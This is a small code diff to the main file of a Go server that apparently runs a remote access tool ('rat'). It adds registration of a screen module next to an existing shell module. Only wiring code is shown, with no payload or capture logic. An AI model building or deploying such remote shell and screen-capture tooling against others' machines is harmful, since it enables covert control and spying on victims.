@@ -10,6 +10,7 @@ import (
 	"strings"
 	"time"
 
+	"server/internal/mod/screen"
 	"server/internal/mod/shell"
 	"server/internal/rat"
 	"server/internal/utility"
@@ -32,6 +33,11 @@ func main() {
 	logger := utility.NewLogQue(os.Stdout, time.Stamp)
 	rat := rat.NewRAT(logger)
 	err := rat.Register(shell.New(logger))
+	if err != nil {
+		logger.Panic(err)
+	}
+
+	err = rat.Register(screen.New(logger))
 	if err != nil {
 		logger.Panic(err)
 	}
